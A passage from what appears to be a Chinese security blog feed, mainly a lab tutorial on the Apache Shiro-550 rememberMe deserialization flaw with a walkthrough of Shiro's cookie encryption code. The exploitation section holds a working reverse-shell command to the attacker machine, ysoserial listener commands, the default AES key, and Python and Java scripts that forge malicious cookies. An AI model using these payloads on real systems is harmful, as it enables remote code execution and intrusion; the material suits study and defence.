rel="noopener">http://www.helix.cool/2020/05/18/Padding-Oracle-Attack/</a><br>我对Padding Oracle攻击的分析和思考（详细）：<a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/15504.html</a><br>Automated Padding Oracle Attacks With PadBuster：<a href="https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html" target="_blank" rel="noopener">https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html</a><br>Understanding MD5 Length Extension Attack:<a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-27070210-id-3255947.html</a><br>MD5哈希(hash)长度扩展攻击:<a href="https://ntwyc2018.github.io/2018/07/10/md5%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">https://ntwyc2018.github.io/2018/07/10/md5%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</a><br>Hash长度扩展攻击：<a href="https://www.smi1e.top/hello-world/" target="_blank" rel="noopener">https://www.smi1e.top/hello-world/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常见的 WEB 密码学攻击&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>shrio漏洞学习</title>
    <link href="https://blog.cfyqy.com/article/bb150e8a.html"/>
    <id>https://blog.cfyqy.com/article/bb150e8a.html</id>
    <published>2021-02-17T13:56:50.000Z</published>
    <updated>2021-02-24T12:30:01.648Z</updated>
    
    <content type="html"><![CDATA[<p>Shrio漏洞学习</p><a id="more"></a><h1 id="Shrio反序列化命令执行（Shiro-550-CVE-2016-4437）"><a href="#Shrio反序列化命令执行（Shiro-550-CVE-2016-4437）" class="headerlink" title="Shrio反序列化命令执行（Shiro-550 CVE-2016-4437）"></a>Shrio反序列化命令执行（Shiro-550 CVE-2016-4437）</h1><p>影响范围：<br>shiro &lt;= 1.2.4 存在反序列化漏洞    </p><p>漏洞缘由：<br>Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：</p><ul><li>检索RememberMe Cookie的值</li><li>Base 64解码</li><li>AES解密（加密密钥硬编码）</li><li>进行反序列化操作（未过滤处理）</li></ul><p>攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令  </p><p>漏洞影响：<br>只要rememberMe的AES加密密钥泄漏，无论shiro什么版本都会导致反序列化漏洞。</p><p>漏洞搭建：<br><a href="https://github.com/Medicean/VulApps/tree/master/s/shiro/1" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/s/shiro/1</a><br>拉取镜像到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure><p>启动环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d -p 8081:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure><p>访问8081端口</p><p><img src="../../images/java/shiro/3.png" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>相关环境：<br>靶机：192.168.247.130<br>攻击机：192.168.247.129</p><p>使用Shiro_exploit工具，检查是否存在默认的key。 </p><p>Github项目地址：  <a href="https://github.com/insightglacier/Shiro_exploit" target="_blank" rel="noopener">https://github.com/insightglacier/Shiro_exploit</a>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http://192.168.247.130:8081/</span><br></pre></td></tr></table></figure><p>存在默认key： CipherKey:kPH+bIxk5D2deZiIxcaaaA==<br><img src="../../images/java/shiro/4.png" alt=""></p><p>利用方式一：反弹shell    </p><p>制作反弹shell 代码<br>使用<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a> 进行编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -I &gt;&amp; /dev/tcp 192.168.247.129/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="../../images/java/shiro/5.png" alt=""></p><p>使用 ysoserial 中 JRMP 监听模块，监听6666端口<br>ysoserial 地址: <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a><br>攻击机中执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 <span class="string">'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0Ny4xMjkvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span></span><br></pre></td></tr></table></figure><p><img src="../../images/java/shiro/6.png" alt=""><br>监听反弹端口 1234<br>攻击机中执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure><p>生成 POC<br>shrio.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])   </span><br><span class="line">    print(<span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload.decode()))</span><br></pre></td></tr></table></figure><p>shrio.py 和 ysoserial.jar 放在同一目录下，攻击机中执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro.py 192.168.247.129:6666</span><br></pre></td></tr></table></figure><p>得到rememberMe<br><img src="../../images/java/shiro/7.png" alt=""><br>抓取登录后的数据包,修改 cookie的 rememberMe 。<br><img src="../../images/java/shiro/8.png" alt=""><br>反弹成功<br><img src="../../images/java/shiro/9.png" alt=""></p><p><strong>利用方式二：写入shell</strong><br>生成poc.ser</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">"echo 'this a test' &gt; /tmp/shell"</span> &gt; poc.ser</span><br></pre></td></tr></table></figure><p>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRemember</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">"d://poc.ser"</span>));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没尝试成功  </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>环境搭建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//jdk1.6版本  window jdk版本切换：w </span><br><span class="line">//maven 3.2.5 maven历史版本下载 https://blog.csdn.net/still_ly/article/details/80905149</span><br><span class="line">//tomcat 7</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git </span><br><span class="line">git checkout shiro-root-1.2.4 </span><br><span class="line"><span class="built_in">cd</span> ./shiro/samples/web </span><br><span class="line">mvn package -D maven.skip.test=<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>在.m2目录下创建一个toolchains.xml文件，然后加入jdk 1.6的路径，这个版本的编译依赖jdk1.6</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;toolchains xmlns=<span class="string">"http://maven.apache.org/TOOLCHAINS/1.1.0"</span> xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line">  xsi:schemaLocation=<span class="string">"http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd"</span>&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;<span class="built_in">type</span>&gt;jdk&lt;/<span class="built_in">type</span>&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.6&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;C:\Program Files\Java\jdk1.6.0_45\&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line">&lt;/toolchains&gt;</span><br></pre></td></tr></table></figure><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin设置断点，点击debug开启tomcat服务，在web端登陆账户，勾选Remember Me按钮，<br><img src="../../images/java/shiro/10.png" alt=""><br>首先代码对调用 forgetIdentity 对subject变量进行处理，跟进此方法，即CookieRememberMeManager类的forgetIdentity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.web.mgt.CookieRememberMeManager</span></span><br><span class="line"> <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">forgetIdentity</span><span class="params">(Subject subject)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (WebUtils.isHttp(subject)) &#123;</span><br><span class="line">            HttpServletRequest request = WebUtils.getHttpRequest(subject);</span><br><span class="line">            HttpServletResponse response = WebUtils.getHttpResponse(subject);</span><br><span class="line">            <span class="keyword">this</span>.forgetIdentity(request, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用 另一 forgetIdentity 方法处理request和response请求，这里调用了removeFrom方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.web.mgt.CookieRememberMeManager</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">forgetIdentity</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.getCookie().removeFrom(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>removeFrom 添加 response 的头部信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.web.servlet.SimpleCookie</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeFrom</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">        String name = <span class="keyword">this</span>.getName();</span><br><span class="line">        String value = <span class="string">"deleteMe"</span>;</span><br><span class="line">        String comment = <span class="keyword">null</span>;</span><br><span class="line">        String domain = <span class="keyword">this</span>.getDomain();</span><br><span class="line">        String path = <span class="keyword">this</span>.calculatePath(request);</span><br><span class="line">        <span class="keyword">int</span> maxAge = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> version = <span class="keyword">this</span>.getVersion();</span><br><span class="line">        <span class="keyword">boolean</span> secure = <span class="keyword">this</span>.isSecure();</span><br><span class="line">        <span class="keyword">boolean</span> httpOnly = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">this</span>.addCookieHeader(response, name, value, (String)comment, domain, path, maxAge, version, secure, httpOnly);</span><br><span class="line">        log.trace(<span class="string">"Removed '&#123;&#125;' cookie by setting maxAge=0"</span>, name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后，重新返回到 onSuccessfulLogin 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.forgetIdentity(subject);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isRememberMe(token)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.rememberIdentity(subject, token, info);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">"AuthenticationToken did not indicate RememberMe is requested.  RememberMe functionality will not be executed for corresponding account."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里判断是否对token进行了isRememberMe，这个 isRememberMe 看是否在这个web登陆中勾选了remember me，这里已勾选，继续下一步</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isRememberMe</span><span class="params">(AuthenticationToken token)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> token != <span class="keyword">null</span> &amp;&amp; token <span class="keyword">instanceof</span> RememberMeAuthenticationToken &amp;&amp; ((RememberMeAuthenticationToken)token).isRememberMe();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>进入 rememberIdentity 方法中,principals 为 用户名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> </span>&#123;</span><br><span class="line">        PrincipalCollection principals = <span class="keyword">this</span>.getIdentityToRemember(subject, authcInfo);</span><br><span class="line">        <span class="keyword">this</span>.rememberIdentity(subject, principals);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>又调用另外一个重载 rememberIdentity，跟进其方法，通过convertPrincipalsToBytes对accountPrincipals变量进行处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">        <span class="keyword">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进convertPrincipalsToBytes方法发现它会序列化我们传入的用户名，然后调用encrypt方法加密序列化后的二进制字节。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line"> <span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.serialize(principals);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            bytes = <span class="keyword">this</span>.encrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进encrypt,使用AES的 CBC分组加密模式，加密秘钥this.getEncryptionCipherKey() 和DEFAULT_CIPHER_KEY_BYTES 一致</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line">   <span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">        CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.encrypt(serialized, <span class="keyword">this</span>.getEncryptionCipherKey());</span><br><span class="line">            value = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再返回rememberIdentity，将序列化用户名并AES加密的二进制字节传入rememberSerializedIdentity方法中，进行base64编码，跟进此方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">        <span class="keyword">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将传入的二进制字节进行base64编码并添加到cookie中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.web.mgt.CookieRememberMeManager</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="keyword">byte</span>[] serialized)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.isHttp(subject)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                String msg = <span class="string">"Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to set the rememberMe cookie. Returning immediately and ignoring rememberMe operation."</span>;</span><br><span class="line">                log.debug(msg);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            HttpServletRequest request = WebUtils.getHttpRequest(subject);</span><br><span class="line">            HttpServletResponse response = WebUtils.getHttpResponse(subject);</span><br><span class="line">            String base64 = Base64.encodeToString(serialized);</span><br><span class="line">            Cookie template = <span class="keyword">this</span>.getCookie();</span><br><span class="line">            Cookie cookie = <span class="keyword">new</span> SimpleCookie(template);</span><br><span class="line">            cookie.setValue(base64);</span><br><span class="line">            cookie.saveTo(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>cookie.saveTo()将cookie的相关属性值添加到reponse请求包头部。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveTo</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.getName();</span><br><span class="line">    String value = <span class="keyword">this</span>.getValue();</span><br><span class="line">    String comment = <span class="keyword">this</span>.getComment();</span><br><span class="line">    String domain = <span class="keyword">this</span>.getDomain();</span><br><span class="line">    String path = <span class="keyword">this</span>.calculatePath(request);</span><br><span class="line">    <span class="keyword">int</span> maxAge = <span class="keyword">this</span>.getMaxAge();</span><br><span class="line">    <span class="keyword">int</span> version = <span class="keyword">this</span>.getVersion();</span><br><span class="line">    <span class="keyword">boolean</span> secure = <span class="keyword">this</span>.isSecure();</span><br><span class="line">    <span class="keyword">boolean</span> httpOnly = <span class="keyword">this</span>.isHttpOnly();</span><br><span class="line">    <span class="keyword">this</span>.addCookieHeader(response, name, value, comment, domain, path, maxAge, version, secure, httpOnly);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密过程就是将登入的用户名进行反序列化，并用AbstractRememberMeManager类的DEFAULT_CIPHER_KEY_BYTES（硬编码）值做为key，进行AES的CBC分组模式进行加密，然后又base64编码，最后添加到response请求包的set-cookie头部里</p><h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>在org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals 方法设置断点<br><img src="../../images/java/shiro/11.jpg" alt=""><br>调用getRememberedSerializedIdentity处理http请求,跟进此方法，利用this.getCookie().readValue(request, response)读取 cookie 中 rememberMe 的值，并对其值进行base64解码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.shiro.web.mgt.CookieRememberMeManager</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                String msg = <span class="string">"SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation."</span>;</span><br><span class="line">                log.debug(msg);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            WebSubjectContext wsc = (WebSubjectContext)subjectContext;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.isIdentityRemoved(wsc)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                HttpServletRequest request = WebUtils.getHttpRequest(wsc);</span><br><span class="line">                HttpServletResponse response = 